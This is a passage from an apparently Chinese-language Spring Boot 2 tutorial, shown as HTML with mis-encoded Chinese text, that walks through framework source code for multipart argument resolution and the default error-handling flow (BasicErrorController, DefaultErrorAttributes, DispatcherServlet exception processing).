mpArg;<br>&#125;<br>        <br>        ...<br><br><span class="hljs-keyword">return</span> adaptArgumentIfNecessary(arg, parameter);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultipartResolutionDelegate</span> &#123;<br>    ...<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">resolveMultipartArgument</span><span class="hljs-params">(String name, MethodParameter parameter, HttpServletRequest request)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span><br>WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isMultipart</span> <span class="hljs-operator">=</span> (multipartRequest != <span class="hljs-literal">null</span> || isMultipartContent(request));<br><br><span class="hljs-keyword">if</span> (MultipartFile.class == parameter.getNestedParameterType()) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br><span class="hljs-keyword">return</span> multipartRequest.getFile(name);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMultipartFileCollection(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br>List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);<br><span class="hljs-keyword">return</span> (!files.isEmpty() ? files : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMultipartFileArray(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br>List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);<br><span class="hljs-keyword">return</span> (!files.isEmpty() ? files.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartFile</span>[<span class="hljs-number">0</span>]) : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Part.class == parameter.getNestedParameterType()) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">return</span> request.getPart(name);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isPartCollection(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>List&lt;Part&gt; parts = resolvePartList(request, name);<br><span class="hljs-keyword">return</span> (!parts.isEmpty() ? parts : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isPartArray(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>List&lt;Part&gt; parts = resolvePartList(request, name);<br><span class="hljs-keyword">return</span> (!parts.isEmpty() ? parts.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Part</span>[<span class="hljs-number">0</span>]) : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> UNRESOLVABLE;<br>&#125;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="52ã€é”™è¯¯å¤„ç†-SpringBooté»˜è®¤é”™è¯¯å¤„ç†æœºåˆ¶"><a href="#52ã€é”™è¯¯å¤„ç†-SpringBooté»˜è®¤é”™è¯¯å¤„ç†æœºåˆ¶" class="headerlink" title="52ã€é”™è¯¯å¤„ç†-SpringBooté»˜è®¤é”™è¯¯å¤„ç†æœºåˆ¶"></a>52ã€é”™è¯¯å¤„ç†-SpringBooté»˜è®¤é”™è¯¯å¤„ç†æœºåˆ¶</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-error-handling">Spring Bootå®˜æ–¹æ–‡æ¡£ - Error Handling</a></p><p><strong>é»˜è®¤è§„åˆ™</strong>ï¼š</p><ul><li><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒSpring Bootæä¾›<code>/error</code>å¤„ç†æ‰€æœ‰é”™è¯¯çš„æ˜ å°„</p></li><li><p>æœºå™¨å®¢æˆ·ç«¯ï¼Œå®ƒå°†ç”ŸæˆJSONå“åº”ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯ï¼ŒHTTPçŠ¶æ€å’Œå¼‚å¸¸æ¶ˆæ¯çš„è¯¦ç»†ä¿¡æ¯ã€‚å¯¹äºæµè§ˆå™¨å®¢æˆ·ç«¯ï¼Œå“åº”ä¸€ä¸ªâ€œ whitelabelâ€é”™è¯¯è§†å›¾ï¼Œä»¥HTMLæ ¼å¼å‘ˆç°ç›¸åŒçš„æ•°æ®</p></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2020-11-22T05:53:28.416+00:00&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">404</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Not Found&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;No message available&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/asadada&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li><p>è¦å¯¹å…¶è¿›è¡Œè‡ªå®šä¹‰ï¼Œæ·»åŠ <code>View</code>è§£æä¸º<code>error</code></p></li><li><p>è¦å®Œå…¨æ›¿æ¢é»˜è®¤è¡Œä¸ºï¼Œå¯ä»¥å®ç° <code>ErrorController </code>å¹¶æ³¨å†Œè¯¥ç±»å‹çš„Beanå®šä¹‰ï¼Œæˆ–æ·»åŠ <code>ErrorAttributesç±»å‹çš„ç»„ä»¶</code>ä»¥ä½¿ç”¨ç°æœ‰æœºåˆ¶ä½†æ›¿æ¢å…¶å†…å®¹ã€‚</p></li><li><p><code>/templates/error/</code>ä¸‹çš„4xxï¼Œ5xxé¡µé¢ä¼šè¢«è‡ªåŠ¨è§£æ</p></li></ul><h2 id="53ã€é”™è¯¯å¤„ç†-ã€æºç åˆ†æã€‘åº•å±‚ç»„ä»¶åŠŸèƒ½åˆ†æ"><a href="#53ã€é”™è¯¯å¤„ç†-ã€æºç åˆ†æã€‘åº•å±‚ç»„ä»¶åŠŸèƒ½åˆ†æ" class="headerlink" title="53ã€é”™è¯¯å¤„ç†-ã€æºç åˆ†æã€‘åº•å±‚ç»„ä»¶åŠŸèƒ½åˆ†æ"></a>53ã€é”™è¯¯å¤„ç†-ã€æºç åˆ†æã€‘åº•å±‚ç»„ä»¶åŠŸèƒ½åˆ†æ</h2><ul><li><code>ErrorMvcAutoConfiguration</code>  è‡ªåŠ¨é…ç½®å¼‚å¸¸å¤„ç†è§„åˆ™</li><li><strong>å®¹å™¨ä¸­çš„ç»„ä»¶</strong>ï¼šç±»å‹ï¼š<code>DefaultErrorAttributes</code> -&gt; idï¼š<code>errorAttributes</code></li><li><code>public class DefaultErrorAttributes implements ErrorAttributes, HandlerExceptionResolver</code><ul><li><code>DefaultErrorAttributes</code>ï¼šå®šä¹‰é”™è¯¯é¡µé¢ä¸­å¯ä»¥åŒ…å«æ•°æ®ï¼ˆå¼‚å¸¸æ˜ç»†ï¼Œå †æ ˆä¿¡æ¯ç­‰ï¼‰ã€‚</li></ul></li><li><strong>å®¹å™¨ä¸­çš„ç»„ä»¶</strong>ï¼šç±»å‹ï¼š<code>BasicErrorController</code> â€“&gt; idï¼š<code>basicErrorController</code>ï¼ˆjson+ç™½é¡µ é€‚é…å“åº”ï¼‰</li><li><strong>å¤„ç†é»˜è®¤ <code>/error</code> è·¯å¾„çš„è¯·æ±‚</strong>ï¼Œé¡µé¢å“åº” <code>new ModelAndView(&quot;error&quot;, model);</code><ul><li>å®¹å™¨ä¸­æœ‰ç»„ä»¶ <code>View</code>-&gt;idæ˜¯errorï¼›ï¼ˆå“åº”é»˜è®¤é”™è¯¯é¡µï¼‰</li><li>å®¹å™¨ä¸­æ”¾ç»„ä»¶ <code>BeanNameViewResolver</code>ï¼ˆè§†å›¾è§£æå™¨ï¼‰ï¼›æŒ‰ç…§è¿”å›çš„è§†å›¾åä½œä¸ºç»„ä»¶çš„idå»å®¹å™¨ä¸­æ‰¾<code>View</code>å¯¹è±¡ã€‚</li></ul></li><li><strong>å®¹å™¨ä¸­çš„ç»„ä»¶</strong>ï¼šç±»å‹ï¼š<code>DefaultErrorViewResolver</code> -&gt; idï¼š<code>conventionErrorViewResolver</code></li><li><strong>å¦‚æœå‘ç”Ÿå¼‚å¸¸é”™è¯¯ï¼Œä¼šä»¥HTTPçš„çŠ¶æ€ç  ä½œä¸ºè§†å›¾é¡µåœ°å€ï¼ˆviewNameï¼‰ï¼Œæ‰¾åˆ°çœŸæ­£çš„é¡µé¢</strong>ï¼ˆä¸»è¦ä½œç”¨ï¼‰ã€‚<ul><li>error&#x2F;404ã€5xx.html</li><li>å¦‚æœæƒ³è¦è¿”å›é¡µé¢ï¼Œå°±ä¼šæ‰¾errorè§†å›¾ï¼ˆ<code>StaticView</code>é»˜è®¤æ˜¯ä¸€ä¸ªç™½é¡µï¼‰ã€‚</li></ul></li></ul><h2 id="54ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å¼‚å¸¸å¤„ç†æµç¨‹"><a href="#54ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å¼‚å¸¸å¤„ç†æµç¨‹" class="headerlink" title="54ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å¼‚å¸¸å¤„ç†æµç¨‹"></a>54ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å¼‚å¸¸å¤„ç†æµç¨‹</h2><p>è­¬å¦‚å†™ä¸€ä¸ªä¼šæŠ›å‡ºå¼‚å¸¸çš„æ§åˆ¶å±‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> / <span class="hljs-number">0</span>;<span class="hljs-comment">//å°†ä¼šæŠ›å‡ºArithmeticException</span><br><br>        log.info(<span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æµè§ˆå™¨å‘å‡º<code>/hello</code>è¯·æ±‚ï¼Œ<code>DispatcherServlet</code>çš„<code>doDispatch()</code>çš„<code>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</code>å°†ä¼šæŠ›å‡º<code>ArithmeticException</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    ...<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><span class="hljs-comment">// Actually invoke the handler.</span><br>            <span class="hljs-comment">//å°†ä¼šæŠ›å‡ºArithmeticException</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>applyDefaultViewName(processedRequest, mv);<br>mappedHandler.applyPostHandle(processedRequest, response, mv);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>                <span class="hljs-comment">//å°†ä¼šæ•æ‰ArithmeticException</span><br>dispatchException = ex;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>...<br>&#125;<br>    <span class="hljs-comment">//æ•æ‰åï¼Œç»§ç»­è¿è¡Œ</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">errorView</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">if</span> (exception != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (exception <span class="hljs-keyword">instanceof</span> ModelAndViewDefiningException) &#123;<br>...<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (mappedHandler != <span class="hljs-literal">null</span> ? mappedHandler.getHandler() : <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//ArithmeticExceptionå°†åœ¨è¿™å¤„ç†</span><br>                mv = processHandlerException(request, response, handler, exception);<br>errorView = (mv != <span class="hljs-literal">null</span>);<br>&#125;<br>&#125;<br>...<br>&#125;<br><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">processHandlerException</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">// Success and error responses may use different content types</span><br>request.removeAttribute(HandlerMapping.PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE);<br><br><span class="hljs-comment">// Check registered HandlerExceptionResolvers...</span><br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">exMv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerExceptionResolvers != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//éå†æ‰€æœ‰çš„ handlerExceptionResolversï¼Œçœ‹è°èƒ½å¤„ç†å½“å‰å¼‚å¸¸HandlerExceptionResolverå¤„ç†å™¨å¼‚å¸¸è§£æå™¨</span><br><span class="hljs-keyword">for</span> (HandlerExceptionResolver resolver : <span class="hljs-built_in">this</span>.handlerExceptionResolvers) &#123;<br>exMv = resolver.resolveException(request, response, handler, ex);<br><span class="hljs-keyword">if</span> (exMv != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>...<br><br>        <span class="hljs-comment">//è‹¥åªæœ‰ç³»ç»Ÿçš„è‡ªå¸¦çš„å¼‚å¸¸è§£æå™¨ï¼ˆæ²¡æœ‰è‡ªå®šä¹‰çš„ï¼‰ï¼Œå¼‚å¸¸è¿˜æ˜¯ä¼šæŠ›å‡º</span><br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç³»ç»Ÿè‡ªå¸¦çš„<strong>å¼‚å¸¸è§£æå™¨</strong>ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211315638.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li><code>DefaultErrorAttributes</code>å…ˆæ¥å¤„ç†å¼‚å¸¸ï¼Œå®ƒä¸»è¦åŠŸèƒ½æŠŠå¼‚å¸¸ä¿¡æ¯ä¿å­˜åˆ°requeståŸŸï¼Œå¹¶ä¸”è¿”å›nullã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultErrorAttributes</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ErrorAttributes</span>, HandlerExceptionResolver, Ordered &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">resolveException</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;<br>        <span class="hljs-built_in">this</span>.storeErrorAttributes(request, ex);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">storeErrorAttributes</span><span class="hljs-params">(HttpServletRequest request, Exception ex)</span> &#123;<br>        request.setAttribute(ERROR_ATTRIBUTE, ex);<span class="hljs-comment">//æŠŠå¼‚å¸¸ä¿¡æ¯ä¿å­˜åˆ°requeståŸŸ</span><br>    &#125;<br>    ...<br>    <br>&#125;    <br></code></pre></td></tr></table></figure><ul><li><p>é»˜è®¤æ²¡æœ‰ä»»ä½•è§£æå™¨ï¼ˆä¸Šå›¾çš„<code>HandlerExceptionResolverComposite</code>ï¼‰èƒ½å¤„ç†å¼‚å¸¸ï¼Œæ‰€ä»¥æœ€åå¼‚å¸¸ä¼šè¢«æŠ›å‡ºã€‚</p></li><li><p>æœ€ç»ˆåº•å±‚å°±ä¼šè½¬å‘<code>/error</code> è¯·æ±‚ã€‚ä¼šè¢«åº•å±‚çš„<code>BasicErrorController</code>å¤„ç†ã€‚</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicErrorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractErrorController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(produces = MediaType.TEXT_HTML_VALUE)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">errorHtml</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>       <span class="hljs-type">HttpStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> getStatus(request);<br>       Map&lt;String, Object&gt; model = Collections<br>             .unmodifiableMap(getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.TEXT_HTML)));<br>       response.setStatus(status.value());<br>       <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolveErrorView(request, response, status, model);<br>       <span class="hljs-comment">//å¦‚æœ/template/errorå†…æ²¡æœ‰4**.htmlæˆ–5**.htmlï¼Œ</span><br>       <span class="hljs-comment">//modelAndViewä¸ºç©ºï¼Œæœ€ç»ˆè¿˜æ˜¯è¿”å›viewNameä¸ºerrorçš„modelAndView</span><br>       <span class="hljs-keyword">return</span> (modelAndView != <span class="hljs-literal">null</span>) ? modelAndView : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;error&quot;</span>, model);<br>    &#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ...<br>     <span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>...<br>        <span class="hljs-comment">//æ¸²æŸ“é¡µé¢</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>        ...<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">errorView</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        ...<br><span class="hljs-comment">// Did the handler return a view to render?</span><br><span class="hljs-keyword">if</span> (mv != <span class="hljs-literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;<br>render(mv, request, response);<br><span class="hljs-keyword">if</span> (errorView) &#123;<br>WebUtils.clearErrorRequestAttributes(request);<br>&#125;<br>&#125;<br>...<br>&#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br>View view;<br><span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> mv.getViewName();<br><span class="hljs-keyword">if</span> (viewName != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// We need to 